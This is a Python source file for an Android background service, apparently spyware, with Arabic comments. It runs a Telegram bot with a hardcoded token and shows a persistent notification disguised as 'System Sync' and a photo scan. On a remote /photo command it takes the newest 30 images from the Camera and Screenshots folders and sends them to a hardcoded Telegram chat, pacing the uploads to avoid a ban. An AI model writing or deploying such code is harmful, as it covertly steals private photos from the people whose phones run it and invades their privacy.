import os, time, threading, telebot
from jnius import autoclass

# أدوات أندرويد لضمان استمرار الخدمة
PythonService = autoclass('org.kivy.android.PythonService')
Context = autoclass('android.content.Context')
NotificationBuilder = autoclass('android.app.Notification$Builder')
NotificationChannel = autoclass('android.app.NotificationChannel')
NotificationManager = autoclass('android.app.NotificationManager')
Build = autoclass('android.os.Build')

service = PythonService.mService
context = service.getApplicationContext()

# إنشاء إشعار الخدمة لضمان عدم توقفها
def start_foreground():
    CHANNEL_ID = "photo_sync_channel"
    nm = context.getSystemService(Context.NOTIFICATION_SERVICE)
    if Build.VERSION.SDK_INT >= 26:
        channel = NotificationChannel(CHANNEL_ID, "System Sync", 2)
        nm.createNotificationChannel(channel)
        builder = NotificationBuilder(context, CHANNEL_ID)
    else:
        builder = NotificationBuilder(context)
    
    notification = builder.setContentTitle("تحديث الملفات") \
                          .setContentText("جاري فحص الصور...") \
                          .setSmallIcon(context.getApplicationInfo().icon) \
                          .build()
    service.startForeground(1, notification)

# إعداد البوت (التوكن الخاص بك)
bot = telebot.TeleBot("7820129712:AAH9pZ49S_m8tY8965625902", threaded=False)

@bot.message_handler(commands=['photo'])
def handle_photo(message):
    # مسارات الصور المباشرة
    folders = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/Pictures/Screenshots"
    ]
    
    for folder in folders:
        if os.path.exists(folder):
            try:
                # جلب كل الصور وترتيبها من الأحدث للأقدم
                files = [os.path.join(folder, f) for f in os.listdir(folder) 
                         if f.lower().endswith(('.jpg', '.png', '.jpeg'))]
                files.sort(key=os.path.getmtime, reverse=True)
                
                # إرسال أول 30 صورة من كل مجلد
                for img_path in files[:30]:
                    try:
                        with open(img_path, 'rb') as photo:
                            bot.send_photo("6110903337", photo)
                        time.sleep(0.5) # حماية من الحظر
                    except:
                        continue
            except:
                pass

if __name__ == '__main__':
    start_foreground()
    # تشغيل استقبال الأوامر في الخلفية
    while True:
        try:
            bot.infinity_polling(timeout=20)
        except:
            time.sleep(10)
